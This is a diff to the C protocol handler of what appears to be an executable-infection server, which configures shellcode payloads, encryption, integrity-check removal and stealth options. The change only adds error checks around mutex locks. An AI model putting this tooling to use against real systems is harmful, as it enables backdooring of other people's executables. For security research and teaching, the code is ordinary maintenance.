@@ -79,7 +79,9 @@ static inline void __peserver_debug(PESERVER *server, int sock, char *msg, ...) 
   tm_info = localtime(&timer);
   strftime(buffer, 29, "[%Y:%m:%d %H:%M:%S] ", tm_info);
 
-  pthread_mutex_lock(&server->debug_mutex);
+  if (pthread_mutex_lock(&server->debug_mutex)) {
+    return; /* Error locking mutex */
+  }
   /* print timestamp */
   printf("%s", buffer);
   if (sock != 0) {
@@ -154,7 +156,9 @@ static void inline __peprotocol_process_set_section_name(PEPROTOCOL *protocol, P
   peinfect_set_sectionname(protocol->data, protocol->size, false, server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* allocate memory */
   data_mem = malloc(protocol->size + 1);
@@ -203,7 +207,9 @@ static void inline __peprotocol_process_set_method_change_flags(PEPROTOCOL *prot
           (peinfect_get_methods(server->infect) & ~METHOD_CHANGE_FLAGS), server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("methods", "method_change_flags", protocol->data[0], server->config->config_name)) {
@@ -232,7 +238,9 @@ static void inline __peprotocol_process_set_method_new_section(PEPROTOCOL *proto
           (peinfect_get_methods(server->infect) & ~METHOD_NEW_SECTION), server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("methods", "method_new_section", protocol->data[0], server->config->config_name)) {
@@ -261,7 +269,9 @@ static void inline __peprotocol_process_set_method_alignment_resize(PEPROTOCOL *
           (peinfect_get_methods(server->infect) & ~METHOD_ALIGNMENT_RESIZE), server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("methods", "method_alignment_resize", protocol->data[0], server->config->config_name)) {
@@ -290,7 +300,9 @@ static void inline __peprotocol_process_set_method_alignment(PEPROTOCOL *protoco
           (peinfect_get_methods(server->infect) & ~METHOD_ALIGNMENT), server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("methods", "method_alignment", protocol->data[0], server->config->config_name)) {
@@ -319,7 +331,9 @@ static void inline __peprotocol_process_set_method_cross_section_jump(PEPROTOCOL
           (peinfect_get_methods(server->infect) & ~METHOD_CROSS_SECTION_JUMP), server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("methods", "method_cross_section_jump", protocol->data[0], server->config->config_name)) {
@@ -349,7 +363,9 @@ static void inline __peprotocol_process_set_method_cross_section_jump_iterations
   peinfect_set_jumpiterations(*iterations, server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("methods", "method_cross_section_jump_iterations", *iterations, server->config->config_name)) {
@@ -376,7 +392,9 @@ static void inline __peprotocol_process_set_encrypt(PEPROTOCOL *protocol, PESERV
   peinfect_set_encrypt(option, server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("methods", "encrypt", option, server->config->config_name)) {
@@ -405,7 +423,9 @@ static void inline __peprotocol_process_set_encrypt_iterations(PEPROTOCOL *proto
   peinfect_set_encryptiterations(*iterations, server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("methods", "encrypt_iterations", *iterations, server->config->config_name)) {
@@ -432,7 +452,9 @@ static void inline __peprotocol_process_set_remove_integrity_check(PEPROTOCOL *p
   peinfect_set_removeintegrity(option, server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("integrity", "remove_integrity_check", option, server->config->config_name)) {
@@ -465,7 +487,9 @@ static void inline __peprotocol_process_set_data_port(PEPROTOCOL *protocol, PESE
   }
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   port = (int *) protocol->data;
@@ -491,7 +515,9 @@ static void inline __peprotocol_process_set_data_interface(PEPROTOCOL *protocol,
   }
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("server", "data_interface", protocol->data[0], server->config->config_name)) {
@@ -524,7 +550,9 @@ static void inline __peprotocol_process_set_control_port(PEPROTOCOL *protocol, P
   }
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   port = (int *) protocol->data;
@@ -550,7 +578,9 @@ static void inline __peprotocol_process_set_control_interface(PEPROTOCOL *protoc
   }
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("server", "control_interface", protocol->data[0], server->config->config_name)) {
@@ -570,7 +600,9 @@ static void inline __peprotocol_process_set_payload_x86(PEPROTOCOL *protocol, PE
   peinfect_set_shellcode((unsigned char *) protocol->data, protocol->size, false, server->infect);
 
   /* lock the .bin-file */
-  pthread_mutex_lock(&server->config->shellcode_x86_mutex);
+  if (pthread_mutex_lock(&server->config->shellcode_x86_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* Open file */
   FILE *sc = fopen(server->config->shellcode_x86_name, "w+b");
@@ -597,7 +629,9 @@ static void inline __peprotocol_process_set_payload_x64(PEPROTOCOL *protocol, PE
   peinfect_set_shellcode((unsigned char *) protocol->data, protocol->size, true, server->infect);
 
   /* lock the .bin-file */
-  pthread_mutex_lock(&server->config->shellcode_x64_mutex);
+  if (pthread_mutex_lock(&server->config->shellcode_x64_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* Open file */
   FILE *sc = fopen(server->config->shellcode_x64_name, "w+b");
@@ -633,7 +667,9 @@ static void inline __peprotocol_process_get_config(PEPROTOCOL *protocol, PESERVE
   peserver_write_config(server);
 
   /* lock the config.ini */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* Open file */
   FILE *conf = fopen(server->config->config_name, "rb");
@@ -660,7 +696,7 @@ static void inline __peprotocol_process_get_config(PEPROTOCOL *protocol, PESERVE
         protocol->size = size;
         send(sock, (const void*) protocol, (sizeof(PEPROTOCOL) + protocol->size), 0);
       }
-      
+
       /* free buffer after use */
       free(file_mem);
     }
@@ -686,7 +722,9 @@ static void inline __peprotocol_process_set_payload_name_x86(PEPROTOCOL *protoco
   }
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* allocate memory */
   data_mem = malloc(protocol->size + 1);
@@ -733,7 +771,9 @@ static void inline __peprotocol_process_set_try_stay_stealth(PEPROTOCOL *protoco
   peinfect_set_trystaystealth(option, server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("integrity", "try_stay_stealth", option, server->config->config_name)) {
@@ -760,7 +800,9 @@ static void inline __peprotocol_process_set_enable(PEPROTOCOL *protocol, PESERVE
   peserver_enable_infection(option, server);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("server", "enable", option, server->config->config_name)) {
@@ -786,7 +828,9 @@ static void inline __peprotocol_process_set_random_section_name(PEPROTOCOL *prot
   peinfect_set_sectionname(NULL, 0, true, server->infect);
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* write data to ini */
   if (!ini_putl("name", "section_name_random", protocol->data[0], server->config->config_name)) {
@@ -848,7 +892,9 @@ static void inline __peprotocol_process_set_payload_name_x64(PEPROTOCOL *protoco
   }
 
   /* set a lock */
-  pthread_mutex_lock(&server->config->config_mutex);
+  if (pthread_mutex_lock(&server->config->config_mutex)) {
+    return; /* Error locking mutex */
+  }
 
   /* allocate memory */
   data_mem = malloc(protocol->size + 1);
